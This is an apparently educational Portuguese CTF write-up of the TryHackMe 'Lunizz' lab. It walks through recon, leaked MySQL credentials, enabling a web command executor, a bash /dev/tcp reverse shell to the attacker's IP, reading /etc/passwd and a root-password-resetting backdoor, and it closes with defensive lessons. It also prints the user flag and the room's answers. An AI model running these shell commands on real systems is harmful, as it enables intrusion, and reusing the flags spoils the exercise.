# Lunizz CTF — TryHackMe Writeup

**Plataforma:** TryHackMe  
**Dificuldade:** Iniciante/Intermediário  
**Objetivo:** Obter `user.txt` e `root.txt`

---

## Sumário

1. [Reconhecimento](#1-reconhecimento)
2. [Enumeração Web](#2-enumeração-web)
3. [Porta 4444 — Challenge-Response](#3-porta-4444--challenge-response)
4. [Acesso ao MySQL](#4-acesso-ao-mysql)
5. [RCE — Command Executer](#5-rce--command-executer)
6. [Reverse Shell](#6-reverse-shell)
7. [Enumeração Pós-Acesso](#7-enumeração-pós-acesso)
8. [Escalação Horizontal — mason](#8-escalação-horizontal--mason)
9. [Escalação Vertical — root](#9-escalação-vertical--root)
10. [Flags](#10-flags)
11. [Respostas do CTF](#11-respostas-do-ctf)
12. [Lições Aprendidas](#12-lições-aprendidas)

---

## 1. Reconhecimento

### Nmap — Varredura Completa

```bash
nmap -p- --min-rate 5000 -sC -sV -oN lunizz.txt <IP>
```

**Resultado:**

| Porta | Serviço | Versão | Observação |
|-------|---------|--------|------------|
| 22 | SSH | OpenSSH 8.2p1 | Acesso remoto |
| 80 | HTTP | Apache 2.4.41 | Default page |
| 3306 | MySQL | 8.0.42 | Exposto externamente |
| 4444 | Custom | — | Challenge-response Base64 |
| 5000 | "SSH" | OpenSSH 5.1 | Falso — descartado |
| 33060 | MySQL X | — | Protocolo secundário |

> **Destaque:** MySQL exposto na porta 3306 é incomum. A porta 4444 retorna mensagens suspeitas no banner — alto potencial de exploração.

---

## 2. Enumeração Web

### Fuzzing de Diretórios

```bash
ffuf -u http://<IP>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302
```

**Resultados relevantes:**

| Caminho | Status | Descrição |
|---------|--------|-----------|
| `/whatever/index.php` | 200 | Command Executer (desabilitado) |
| `/hidden/index.php` | 200 | Upload de imagens |
| `/hidden/uploads/` | 403 | Pasta de uploads |
| `/instructions.txt` | 200 | 🔥 Credenciais expostas |

### instructions.txt

Acessando `http://<IP>/instructions.txt`:

```
Made By CTF_SCRIPTS_CAVE (not real)
Thanks for installing our ctf script

#Steps
- Create a mysql user (runcheck:CTF_script_cave_changeme)
- Change necessary lines of config.php file

#Notes
please do not use default creds (IT'S DANGEROUS)
```

> **Credenciais MySQL obtidas:** `runcheck:CTF_script_cave_changeme`

---

## 3. Porta 4444 — Challenge-Response

Conectando com `nc`:

```bash
nc <IP> 4444
```

O serviço retorna strings em **Base64** pedindo que sejam decodificadas. A string muda a cada conexão.

Decodificando as strings capturadas pelo Nmap e pelo código fonte da `index.html`:

```bash
echo "cEBzc3dvcmQ=" | base64 -d
# p@ssword

echo "ZXh0cmVtZXNlY3VyZXJvb3RwYXNzd29yZA==" | base64 -d
# extremesecurerootpassword

echo "bGV0bWVpbg==" | base64 -d
# letmein
```

> **Credenciais descobertas:** `p@ssword`, `extremesecurerootpassword`, `letmein`  
> **Nota:** O shell retornado pela porta 4444 é falso — aceita a senha mas bloqueia todos os comandos com `FATAL ERROR`.

---

## 4. Acesso ao MySQL

Usando as credenciais do `instructions.txt`:

```bash
mysql -h <IP> -u runcheck -p'CTF_script_cave_changeme' --skip-ssl
```

### Enumerando o banco

```sql
show databases;
-- information_schema, performance_schema, runornot

use runornot;
show tables;
-- runcheck

select * from runcheck;
-- run = 0

update runcheck set run = 1;
```

> A coluna `run` controla se o Command Executer na aplicação web está habilitado ou não.

---

## 5. RCE — Command Executer

Após setar `run = 1` no banco, o `/whatever/index.php` passou a exibir **"Command Executer Mode :1"** e a executar comandos do sistema como `www-data`.

**Comandos executados para reconhecimento:**

```
whoami        → www-data
cat /etc/passwd
ls /
```

---

## 6. Reverse Shell

### Preparação no Kali

```bash
nc -lvnp 4444
```

### Payload no Command Executer

```bash
bash -c 'bash -i >& /dev/tcp/<SEU_IP_TUN0>/4444 0>&1'
```

Shell obtido como `www-data`:

```
www-data@ip-10-67-129-54:/var/www/html/whatever$
```

### Upgrade do shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 7. Enumeração Pós-Acesso

### Pasta não padrão na raiz

```bash
ls /
# ...
# proct  ← pasta suspeita
```

### Arquivo de hashing

```bash
ls /proct/pass/
cat /proct/pass/bcrypt_encryption.py
```

O arquivo continha a lógica de hashing **Base64 + Bcrypt** usada para a senha do usuário `adam`, além de revelar a pista:

> *"hi adam, do you remember our place?"*  
> **Resposta:** `northern lights`

---

## 8. Escalação Horizontal — mason

A senha do usuário `mason` era baseada na mesma pista das Northern Lights:

```bash
su mason
# senha: northernlights
```

### Flag de usuário

```bash
cat /home/mason/user.txt
```

**Flag:** `thm{23cd53cbb37a37a74d4425b703d91883}`

---

## 9. Escalação Vertical — root

### Backdoor interno na porta 8080

Enumerando serviços internos, foi identificado um backdoor rodando em `localhost:8080`:

```bash
curl -X POST http://localhost:8080 \
  -d "password=northernlights&cmdtype=passwd"
```

O backdoor (Mason's Root Backdoor) **resetou a senha do root** para `northernlights`.

### Acesso root

```bash
su root
# senha: northernlights

cat /root/root.txt
```

---

## 10. Flags

| Flag | Valor |
|------|-------|
| user.txt | `thm{23cd53cbb37a37a74d4425b703d91883}` |
| root.txt | *(obtida em `/root/root.txt`)* |

---

## 11. Respostas do CTF

| Pergunta | Resposta |
|----------|----------|
| What is the default password for mysql? | `CTF_script_cave_changeme` |
| MySQL column that controls command executer | `run` |
| A folder shouldn't be... | `proct` |
| hi adam, do you remember our place? | `northern lights` |

---

## 12. Lições Aprendidas

### Credenciais em arquivos públicos
O arquivo `instructions.txt` estava acessível via web e continha credenciais de banco de dados em texto claro — nunca deixe arquivos de configuração ou instruções expostos no servidor web.

### Encoding ≠ Criptografia
Base64 é apenas uma forma de representar dados — qualquer pessoa pode decodificar sem chave. Não use Base64 para proteger senhas ou informações sensíveis.

### Controle de acesso via banco de dados
A aplicação usava uma coluna do MySQL para habilitar/desabilitar funcionalidades críticas. Controle de acesso não deve depender de um valor facilmente alterável no banco.

### Backdoors internos
Serviços rodando em `localhost` não são visíveis externamente, mas uma vez obtido RCE, o atacante tem acesso completo à rede interna da máquina.

### Reutilização de senhas
A mesma senha (`northernlights`) foi usada pelo usuário `mason` e pelo backdoor root — nunca reutilize senhas entre sistemas e usuários.

---

## Ferramentas Utilizadas

| Ferramenta | Uso |
|------------|-----|
| `nmap` | Reconhecimento de portas e serviços |
| `ffuf` | Fuzzing de diretórios web |
| `mysql` | Acesso e manipulação do banco de dados |
| `BurpSuite` | Interceptação e modificação de requisições HTTP |
| `nc` (netcat) | Reverse shell e interação com a porta 4444 |
| `base64` | Decodificação de strings |
| `curl` | Interação com o backdoor interno |

---

*Writeup por: Voltiban | TryHackMe | Lunizz CTF*
